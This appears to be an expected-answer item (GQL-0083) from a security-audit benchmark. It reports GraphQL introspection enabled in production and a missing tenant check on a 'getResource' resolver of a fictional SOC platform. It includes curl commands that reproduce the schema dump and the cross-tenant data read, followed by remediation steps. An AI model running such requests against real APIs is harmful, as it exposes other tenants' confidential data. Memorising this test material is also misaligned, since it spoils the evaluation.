# Expected Response

## System
- Domain: Cybersecurity / SOC Platform
- System: ThreatLens SOC Platform
- Example ID: GQL-0083

## Priority Findings

### Finding 1: GraphQL Introspection Enabled — Schema Over-Exposure in Production SOC Platform (Pattern 6.1)
**Severity:** High
**Category:** Misconfiguration / Schema Over-Exposure

**Summary:**
Per §5.0 (Pattern 6.1 — schema/relationship over-exposure): GraphQL introspection is enabled in production on a Security Operations Center platform. An attacker can query `__schema` to discover all resolver names, field names, and relationship paths — including sensitive security-specific fields (`threatId`, `incidentId`, `sensitiveField`, `internalNotes`). Additionally, `getResource` (RISK-GQL-083) has no tenantId check, allowing cross-tenant SOC data access from `tenant-1bca` to `tenant-e4c7`.

**Evidence from HAR:**
- Request: `POST https://api.threatlens-soc-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-1bca`
- Query: `getResource(id: "R-2083") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-e4c7"`, `ownerId: "other-user-1bcae4c7"`, `sensitiveField: "CONFIDENTIAL-1bcae4c7"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-1bcae4c7`

**Root Cause (§4.0 RISK-GQL-083):** `getResource` fetches by ID only; introspection enabled in production.

## Steps to Reproduce

### Step 1 — Schema introspection (Pattern 6.1)
```bash
curl -s -X POST https://api.threatlens-soc-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-1bca" \
  -d '{"query": "{ __schema { types { name fields { name description } } } }"}'
```
**Vulnerable:** Full schema returned including sensitive resolver names and field descriptions.

### Step 2 — Cross-tenant SOC record access (HAR)
```bash
curl -s -X POST https://api.threatlens-soc-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-1bca" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2083\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-1bcae4c7` from `tenant-e4c7`. **Secure:** FORBIDDEN.

## Remediation
1. Disable introspection in production: `introspection: false` in Apollo Server config.
2. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Per-ID ownership filter in `bulkResourceLookup`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
